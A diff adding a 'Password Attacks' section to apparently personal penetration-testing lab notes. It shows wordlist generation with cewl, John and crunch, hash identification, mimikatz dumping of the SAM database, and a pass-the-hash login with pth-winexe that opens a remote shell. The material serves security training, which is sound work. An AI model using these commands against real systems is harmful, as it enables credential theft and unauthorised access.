@@ -661,7 +661,86 @@ Standard sizes for RSA keys :
 
 Generate private RSA key from weak one : [https://github.com/RsaCtfTool/RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool)
 
+## Password Attacks
 
+For example, the following command scrapes the www.megacorpone.com web site, locates words with a minimum of six characters (-m 6), and writes (-w) the wordlist to a custom file (megacorp-cewl.txt):
+
+```
+kali@kali:~$ cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
+kali@kali:~$ wc -l megacorp-cewl.txt
+```
+
+```
+kali@kali:~$ sudo vim /etc/john/john.conf
+...
+# Wordlist mode rules
+[List.Rules:Wordlist]
+# Try words as they are
+:
+# Lowercase every pure alphanumeric word
+-c >3 !?X l Q
+# Capitalize every pure alphanumeric word
+-c (?a >2 !?X c Q
+# Lowercase and pluralize pure alphabetic words
+...
+# Try the second half of split passwords
+-s x_
+-s-c x_ M l Q
+# Add two numbers to the end of each password
+$[0-9]$[0-9]
+...
+
+# Mutate wordlist
+kali@kali:~$ john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt
+```
+
+To generate a wordlist that matches our requirements, we will specify a minimum and maximum word length of eight characters (8 8) and describe our rule pattern with -t ,@@^^%%%:
+
+| PLACEHOLDER | CHARACTER TRANSLATION              |
+| ----------- | ---------------------------------- |
+| @           | Lower case alpha characters        |
+| ,           | Upper case alpha characters        |
+| %           | Numeric characters                 |
+| ^           | Special characters including space |
+
+```
+kali@kali:~$ crunch 8 8 -t ,@@^^%%%
+```
+
+#### Detect hash
+
+```
+hashid c43ee559d69bc7f691fe2fbfe8a5ef0a
+hashid '$6$l5bL6XIASslBwwUD$bCxeTlbhTH76wE.bI66aMYSeDXKQ8s7JNFwa1s1KkTand6ZsqQKAF3G0tHD9bd59e5NAz/s7DQcAojRTWNpZX0'
+```
+
+#### mimikatz
+
+run as admin
+
+```
+C:\> C:\Tools\password_attacks\mimikatz.exe
+...
+### enables the SeDebugPrivilge access right required to tamper with another process
+mimikatz # privilege::debug
+Privilege '20' OK
+
+### elevate the security token from high integrity (administrator)
+mimikatz # token::elevate
+
+### dump the contents of the SAM database: 
+mimikatz # lsadump::sam
+```
+
+```
+kali@kali:~$ pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
+E_md4hash wrapper called.
+HASH PASS: Substituting user supplied NTLM HASH...
+Microsoft Windows [Version 10.0.16299.309]
+(c) 2017 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
 
 ## Cracking
 
